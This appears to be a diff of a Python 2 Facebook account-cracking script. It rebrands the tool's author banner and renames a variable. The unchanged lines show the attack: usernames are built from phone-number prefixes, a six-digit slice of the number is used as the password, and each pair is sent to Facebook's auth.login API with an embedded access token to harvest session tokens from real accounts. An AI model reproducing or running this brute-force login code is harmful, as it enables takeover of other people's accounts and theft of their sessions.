@@ -117,10 +117,10 @@ def menu():
     os.system('clear')
     print logo
     print ''
-    print '\033[0;93mAUTHOR   : It"s Omar Faruk'
-    print '\033[0;94mFACEBOOK : Omar Faruk YT'
-    print '\033[0;96mCreator : https://www.facebook.com/omar.farukyt.5'
-    print '\033[0;96mpage: It`s Omar Faruk & The dark hunter mafia'
+    print '\033[0;93mADMIN  :  MD.RABBI [INCEPTION]'
+    print '\033[0;94mGITHUB : INC3-PTION'
+    print '\033[0;96mFACEBOOK : https://www.facebook.com/iam.inc3ption'
+    print '\033[0;96mTOOL V. : 0.3(Debug)'
     print ''
     print '\033[0;90mOnly Bangladesh Account Are Available'
     print '\033[0;91m'
@@ -267,8 +267,8 @@ def action():
  
         try:
             result = k + c + user
-            digi8 = result[8:14]
-            pass1 = digi8
+            digi6 = result[8:14]
+            pass1 = digi6
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
